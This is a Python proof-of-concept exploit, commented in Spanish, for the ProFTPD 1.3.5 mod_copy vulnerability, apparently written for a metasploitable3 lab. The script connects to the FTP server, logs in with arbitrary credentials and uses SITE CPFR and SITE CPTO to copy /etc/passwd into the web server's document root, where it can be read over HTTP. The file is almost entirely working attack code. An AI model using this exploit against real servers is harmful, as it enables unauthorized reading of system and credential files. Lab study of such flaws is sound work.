# Creación del exploit para PROFTPD 1.3.5

import socket

class Exploit: # Exploit class for PROFTPD 1.3.5
    def __init__(self, target_ip, target_port, path):
        self.target_ip = target_ip
        self.target_port = target_port
        self.path = path # Donde se va a escribir el fichero que seleccionemos del servidor.
        self.sock = None

        '''
        La idea de este exploit es seleccionar un archivo dentro del servidor y pasarlo a una
        ubicación que nosotros elijamos en el servidor FTP vulnerable.

        La ubicación del archivo, en este ejemplo usando la máquina vulnerable metasploitable3 es:
        http://192.168.146.139/index.html

        Dicha ubicación es la que muestra la máquina metasploitable3 porque expone un servidor web.
        Por esta razón, vamos a seleccionar un archivo del servidor FTP y lo vamos a mover al index
        así accedemos a él vía web.

        En este POC, vamos a seleccionar el archivo /etc/passwd del servidor FTP y lo vamos a mover
        a la ubicación anteriormente mencionada.
        '''
    
    def connect(self): # Se va a encargar de conectar con el servidor FTP vulnerable
        try:
            self.sock = socket.create_connection((self.target_ip, self.target_port))
            print(f"[+] Conectado a {self.target_ip}:{self.target_port}")
        except Exception as e:
            print(f"[-] No se pudo conectar a {self.target_ip}:{self.target_port} - {e}")
            return False
        return True

    '''
    Una vez conectados al servidor FTP vulnerable, vamos a enviarle los comandos necesarios para
    mover el archivo seleccionado a la ubicación que queramos.
    '''

    def send_command(self, command):
        try:
            self.sock.sendall(command.encode('utf-8') + b'\r\n')
            response = self.sock.recv(4096).decode('utf-8')
            print(f"[+] Comando enviado: {command.strip()}")
            return response
        except Exception as e:
            print(f"[-] Error al enviar comando {command} - {e}")
            return None
    
    '''
    Se va a crear la explotación en sí.
    '''

    def exploit(self):
        # Comandos FTP para mover el archivo /etc/passwd a la ubicación deseada
        r1 = self.send_command("USER test")
        r2 = self.send_command("PASS test")

        '''
        Cualquier usuario y contraseña vale, ya que el servidor FTP vulnerable permite
        conexiones anónimas.
        '''

        r3 = self.send_command("SITE CPFR /etc/passwd") # Selección del archivo a copiar
        respuesta = self.send_command(f"SITE CPTO {self.path}") # Destino del archivo con el nombre elegido

        # Validación de la acción
        if respuesta:
            print(f"[+] Archivo movido exitosamente a {self.path}")
        else:
            print(f"[-] Fallo al mover el archivo a {self.path} debido a: {respuesta}")
    
    '''
    Por último, se va a ejecutar todo el proceso.
    '''

    def run(self):
        if self.connect():
            self.exploit()
            self.sock.close()
            print("[+] Conexión cerrada.")